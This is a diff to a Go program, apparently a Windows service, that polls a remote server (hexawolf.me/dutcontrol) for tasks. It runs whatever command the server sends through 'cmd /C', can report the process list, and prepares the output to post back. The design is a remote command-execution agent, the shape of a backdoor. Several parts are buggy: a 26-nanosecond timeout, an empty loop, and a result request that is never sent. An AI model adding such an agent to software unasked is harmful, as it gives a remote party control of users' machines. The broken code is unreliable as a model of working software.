@@ -23,40 +23,83 @@
 package main
 
 import (
+	"bufio"
+	"encoding/json"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"os/exec"
+	"strings"
 	"time"
 )
 
-const eventURL = "https://hexawolf.me/sutcontrol"
+const baseURL = "https://hexawolf.me/dutcontrol/api"
 
-func longPoll(key string) {
+func processResponse(resp *http.Response, client *http.Client) {
+	bodyBytes, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Println("Unable to get entire packet:", err)
+		return
+	}
+	var body map[string]interface{}
+	err = json.Unmarshal(bodyBytes, &body)
+	if err != nil {
+		elog.Warning(1, "Invalid packet received: " + err.Error())
+		return
+	}
+	resp.Body.Close()
+	taskType := body["type"].(string)
+	var response string
+	switch taskType {
+	case "execute_cmd":
+		command := body["cmd"].(string)
+		if command == "" {
+			response = "Empty command is not allowed!"
+		}
+		out := exec.Command("cmd", "/C", command)
+		returnResult, err := out.Output()
+		if err != nil {
+			response = err.Error()
+		}
+		response = string(returnResult)
+		break
+	case "proclist":
+		out := exec.Command("cmd", "/C", "tasklist /V")
+		returnResult, err := out.Output()
+		if err != nil {
+			response = err.Error()
+		}
+		taskListStruct := make(map[string][]string)
+		scanner := bufio.NewScanner(strings.NewReader(string(returnResult)))
+		// Skip 3 lines
+		scanner.Scan()
+		scanner.Scan()
+		scanner.Scan()
+		for scanner.Scan() {
+
+		}
+		//taskListStruct["procs"] =
+		response = string(returnResult)
+		break
+	default:
+		response = "Invalid command"
+	}
+	http.NewRequest("POST", baseURL + "/task_result?id=" + body["id"].(string), strings.NewReader(response))
+}
+
+func longPoll(id, key string) {
 	client := &http.Client{
 		Timeout: 26,
 	}
 
 	for {
-		resp, err := client.Get(eventURL + "?key=" + key)
+		req, err := http.NewRequest("GET", baseURL + "/tasks", nil)
+		req.Header.Add("Authorization", id + ":" + key)
+		resp, err := client.Do(req)
 		if err != nil || resp.StatusCode != http.StatusOK {
 			time.Sleep(30 * time.Second)
 			continue
 		}
-		bodyBytes, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			continue
-		}
-		bodyString := string(bodyBytes)
-		resp.Body.Close()
-		out := exec.Command("cmd", "/C", bodyString)
-		err = out.Run()
-		resultURL := eventURL + "?result="
-		if err != nil {
-			elog.Warning(1, "Failed to execute remote command: " + err.Error())
-			resultURL += "FAILED"
-		} else {
-			resultURL += "SUCCESS"
-		}
-		client.Head(resultURL)
+		go processResponse(resp, client)
 	}
 }
